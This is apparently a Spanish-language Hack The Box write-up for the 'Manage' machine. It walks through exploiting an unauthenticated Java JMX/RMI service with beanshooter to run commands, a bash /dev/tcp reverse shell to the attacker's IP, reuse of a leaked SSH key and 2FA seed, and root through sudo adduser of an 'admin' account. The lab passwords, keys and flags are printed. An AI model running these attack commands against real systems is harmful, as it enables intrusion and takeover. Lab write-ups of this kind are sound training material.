---
tags:
title: Manage - Easy (HTB)
permalink: /Manage-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,2222,8080,35805,36735 10.129.234.57
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 14:02 -0500
Nmap scan report for 10.129.234.57
Host is up (2.8s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)
|_  256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)
2222/tcp  open  java-rmi   Java RMI
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:36735
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http       Apache Tomcat 10.1.19
|_http-title: Apache Tomcat/10.1.19
|_http-favicon: Apache Tomcat
35805/tcp open  tcpwrapped
36735/tcp open  java-rmi   Java RMI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.45 seconds
```

## Website / Port 8080

En la pagina web no puedo ni siquiera acceder al panel de administración de `tomcat`.

![image-center](/assets/images/Pasted image 20260205160254.png)
### Java RMI

Para enumerar el puerto `2222` en el que corre `java-rmi`, use `beanshooter`, el cual descargue el script de [este repositorio](https://github.com/qtc-de/beanshooter/releases/tag/v4.1.0), y usando el parámetro `enum` no vi nada interesante, excepto unas credenciales de `tomcat`

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
[+] Checking available bound names:
[+]
[+] 	* jmxrmi (JMX endpoint: 127.0.1.1:36735)
[+]
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server does not require authentication.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer rejected the payload class.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
<SNIP>
pe=DiagnosticCommand) (action: diagnostic)
[+]
[+] Enumerating tomcat users:
[+]
[+] 	- Listing 2 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  fhErvo2r9wuTEYiYgt
[+] 		Roles:
[+] 			   Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  onyRPCkaG4iX72BrRtKgbszd
[+] 		Roles:
[+] 	
```
## Shell as tomcat
### RCE

Para poder empezar a ejecutar comandos con este binario, puedo primero desplegar un `StandarMBean` el cual puedo usar para luego cargar un `TonkaBean` con el que puedo empezar a ejecutar comandos en el sistema.

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.129.234.57 2222 tonka
[+] Creating a TemplateImpl payload object to abuse StandardMBean
[+]
[+] 	Deplyoing MBean: StandardMBean
[+] 	MBean with object name de.qtc.beanshooter:standard=2496546896773 was successfully deployed.
[+]
[+] 	Caught NullPointerException while invoking the newTransformer action.
[+] 	This is expected bahavior and the attack most likely worked :)
[+]
[+] 	Removing MBean with ObjectName de.qtc.beanshooter:standard=2496546896773 from the MBeanServer.
[+] 	MBean was successfully removed.
```

Una vez desplegado, puedo usar `tonka exec` para probar la ejecución de un `ping` a mi maquina.

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka exec 10.129.234.57 2222 'ping -c 1 10.10.17.19'
[+] Invoking the executeCommand method with arguments: [ping, -c, 1, 10.10.17.19]
[+] The call was successful
[+]
[+] Server response:
PING 10.10.17.19 (10.10.17.19) 56(84) bytes of data.
64 bytes from 10.10.17.19: icmp_seq=1 ttl=63 time=3907 ms

--- 10.10.17.19 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 3906.759/3906.759/3906.759/0.000 ms
```

Y veo que con éxito tengo la conexión.

```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:43:21.655917 IP 10.129.234.57 > 10.10.17.19: ICMP echo request, id 1, seq 1, length 64
14:43:21.656761 IP 10.10.17.19 > 10.129.234.57: ICMP echo reply, id 1, seq 1, length 64
```
### Shell

Por lo que ahora usando `tonka shell` puedo spawnear una shell, ejecutando así comandos como el usuario `tomcat`.

```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222
[tomcat@10.129.234.57 /]$ whoami
tomcat
```

Por lo que ahora me envié una shell como el siguiente comando.

```bash
[tomcat@10.129.234.57 /]$ bash -c '/bin/sh -i >& /dev/tcp/10.10.17.19/4444 0>&1'
```

Y desde mi listener recibo la conexión.

```bash
 nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.234.57] 49340
/bin/sh: 0: can't access tty; job control turned off
$
```

```bash
tomcat@manage:/home$ find / -name user.txt 2>/dev/null
/opt/tomcat/user.txt
tomcat@manage:/home$ cat /opt/tomcat/user.txt
a86d44c7243b65a9171cf7da3e0bc279
```
## Shell as useradmin
### Backup file

Cuando quiero migrar al usuario `useradm` con la password reutilizable del usuario `admin` de tomcat, me pide un código de verificación.

```bash
tomcat@manage:/tmp/backup$ su useradmin
Password:
Verification code:
```

Sin embargo, en el directorio de este usuario hay un archivo comprimido.
Por lo que cree una carpeta en el directorio `/tmp`, y luego dentro de la misma descomprimí el archivo, viendo así la clave privada `ed_25519` del usuario `useradm` junto con el archivo `.google_authenticator`.

```bash
tomcat@manage:/home/useradmin/backups$ cp backup.tar.gz /tmp/backup/
tomcat@manage:/home/useradmin/backups$ cd /tmp/backup/
tomcat@manage:/tmp/backup$ ls
backup.tar.gz
tomcat@manage:/tmp/backup$ tar -xvf backup.tar.gz
./
./.bash_logout
./.profile
./.ssh/
./.ssh/id_ed25519
./.ssh/authorized_keys
./.ssh/id_ed25519.pub
./.bashrc
./.google_authenticator
./.cache/
./.cache/motd.legal-displayed
./.bash_history
```
### 2FA Auth code

Este archivo contiene la `"semilla"` con la que puedo generar nuevos códigos de verificación, y además puedo loguearme usando este.

```bash
tomcat@manage:/tmp/backup$ cat .google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775
```

Para conectarme por `ssh` copie la clave y le di permisos de lectura `chmod 600 id_ed25519`.

```bash
useradmin@manage:~/.ssh$ cat id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaAAAAJiHKYIbhymC
GwAAAAtzc2gtZWQyNTUxOQAAACAKDh98jQtlV7BLoEEadDIQUrc5hD48KsQqyFXG9u+WaA
AAAECudKxoxJ6Vz74ca74nZArTpJUIagIpT06hEYuLpk4nkQoOH3yNC2VXsEugQRp0MhBS
tzmEPjwqxCrIVcb275ZoAAAAEHVzZXJhZG1pbkBtYW5hZ2UBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Y use la misma para conectarme, proporcionando además un código.

```bash
ssh useradmin@10.129.234.57 -i id_ed25519
(useradmin@10.129.234.57) Verification code:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)

<SNIP>

useradmin@manage:~$
```
## Shell as root
### Sudo privilege abuse

Viendo los privilegios `sudo` de este usuario, veo que puedo usar `adduser` para agregar cualquier usuario.

```bash
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```
### Hereditary privileges

Cuando creas un nuevo usuario con `adduser`, el usuario se crea con el nombre del grupo de su mismo nombre, por ejemplo si creo el usuario `zsln` su grupo es `zsln`, sabiendo esto, en Ubuntu o Debian, existe el grupo sudo, el cual tiene los máximos privilegios en el sistema, y además el grupo `admin`, el cual antiguamente se usaba en sistemas basados en `Debian` o `Ubuntu` y el cual tenia los mismos privilegios que el grupo `sudo`.
Muchos sistemas mantienen por compatibilidad una línea en el archivo `/etc/sudoers` que se ve así:

```bash
# Member of the admin group may gain root privileges
%admin ALL=(ALL) ALL
```

El símbolo `%` indica que la regla se aplica a un **grupo**, no a un usuario individual.

Por lo que si creo al usuario `admin`, esta regla se `despierta` por así decir, y se crea el grupo admin, dándole a este usuario los máximos privilegios.
Luego de crearlo le setee una password y luego rellene todos los campos en blanco.

```bash
useradmin@manage:~$ sudo /usr/sbin/adduser admin
Adding user `admin' ...
Adding new group `admin' (1005) ...
Adding new user `admin' (1005) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
```

Luego de migrar, veo que puedo ejecutar como `root` cualquier comando.

```bash
useradmin@manage:~$ su - admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:~$ sudo -l
[sudo] password for admin:
Matching Defaults entries for admin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on manage:
    (ALL) ALL
```

Por lo que me convertí en `root` usando `sudo`.

```bash
admin@manage:~$ sudo -i
root@manage:~# cat /root/root.txt
b3645b7e6db6d5276ad33f0c75b8dc34
```

`~Happy Hacking.`